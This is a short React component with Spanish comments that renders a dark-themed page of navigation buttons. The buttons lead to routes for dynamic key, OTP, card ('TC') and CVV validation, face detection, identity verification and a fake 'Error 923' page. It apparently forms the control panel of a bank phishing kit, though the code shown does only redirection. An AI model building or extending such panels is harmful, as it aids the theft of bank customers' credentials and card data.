// Se exporta el componente
export default function General() {

  // Funcion para manejar el redireccionamiento
  const handleRedireccionar = (url) => {

    // Se redirecciona
    window.location.href = url;
  };

  // Se retorna el componente
  return (
    <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
      <div
        style={{
          flex: 1,
          backgroundColor: "#2C2A29",
          backgroundImage: 'url("/assets/images/auth-trazo.svg")',
          backgroundRepeat: "no-repeat",
          backgroundPosition: "center",
          backgroundSize: "cover",
          backgroundPositionY: "-140px",
          backgroundPositionX: "-610px",
        }}
      >
        <div style={{ textAlign: "center" }}>
          <img
            src="/assets/images/img_pantalla2/descarga.svg"
            alt="Logo"
            style={{ width: "238px", marginTop: "45px" }}
          />
        </div>

        <div
          style={{
            marginTop: "25px",
          }}
        >
          <h1 className="general-title" style={{ fontSize: "21.5px" }}>
          </h1>
        </div>

        <div className="login-page">
          <div className="login-box mb-4" style={{ backgroundColor: "#454648" }}>
            <div className="buttons-grid mb-4">
              <button className="login-btn" onClick={() => handleRedireccionar("/autenticacion")}>
                Autenticación
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar("/clave-dinamica")}>
                Clave Dinámica
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/numero-otp')}>
                OTP
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/error-923page')}>
                Error 923
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/ingresa-tus-datos')}>
                Ingresa tus datos
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/tc-customs')}>
                TC Customs
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/finalizado-page')}>
                Finalizado
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/verificacion-identidad')}>
                Verificación Identidad
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/cvv-customs')}>
                CVV Customs
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/deteccion-rostros')}>
                Deteccion de rostros
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/validacion-cvv')}>
                Validación CVV
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/validacion-tc')}>
                Validación TC
              </button>

              <button className="login-btn" onClick={() => handleRedireccionar('/vista-principal')}>
                Vista Principal
              </button>
            </div>
          </div>
        </div>
      </div>
      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
      </div>
    </div>
  );
};